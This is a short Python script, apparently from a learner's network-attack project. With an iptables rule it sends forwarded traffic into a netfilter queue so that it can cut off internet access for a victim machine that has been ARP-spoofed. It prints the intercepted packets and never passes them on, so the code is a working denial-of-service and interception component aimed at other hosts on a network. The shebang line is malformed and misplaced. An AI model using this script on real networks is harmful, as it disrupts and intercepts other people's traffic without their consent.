#this will cut down the internet for other machine which is being spoofed by our ARP_Spoofer
#command before running this program, "iptables -I FORWARD -j NFQUEUE --queue-num 0"
#!usr/bin/env python

import netfilterqueue

def process_packet(packet):
    print(packet)

queue = netfilterqueue.NetfilterQueue()
# 0 because we specified 0 queue-num in command, "iptables -I FORWARD -j NFQUEUE --queue-num 0"
queue.bind(0,process_packet)
queue.run()